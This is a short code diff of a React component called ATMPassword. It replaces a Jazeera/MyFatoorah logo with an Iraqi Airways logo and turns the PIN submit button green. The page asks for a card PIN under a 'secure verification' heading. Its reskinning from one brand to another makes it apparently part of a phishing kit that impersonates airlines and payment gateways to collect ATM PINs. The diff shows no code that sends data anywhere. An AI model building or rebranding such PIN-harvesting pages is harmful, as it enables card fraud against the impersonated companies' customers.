@@ -164,7 +164,7 @@ export default function ATMPassword() {
       <div className="w-full max-w-[480px]">
         {/* Header - Jazeera branding */}
         <div className="text-center mb-8">
-          <img src="/images/myfatoorah_jazeera_logo.png" alt="الخطوط الجوية العراقية" className="h-20 mx-auto mb-2" style={{ background: 'none' }} />
+          <img src="/iraqi_airways/upload/logo.png" alt="Iraqi Airways" className="h-16 mx-auto mb-2" style={{ background: 'none' }} />
           <p className="text-sm text-gray-500">{t.secureVerification}</p>
         </div>
 
@@ -240,7 +240,7 @@ export default function ATMPassword() {
             {/* Submit Button */}
             <button 
               type="submit" 
-              className="w-full py-3 bg-black text-white text-sm font-medium uppercase tracking-wider rounded-md hover:bg-gray-900 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed"
+              className="w-full py-3 text-white text-sm font-medium uppercase tracking-wider rounded-md transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed" style={{backgroundColor: '#1B5E20'}}
               disabled={isWaiting || !isPinComplete}
             >
               {isWaiting ? (
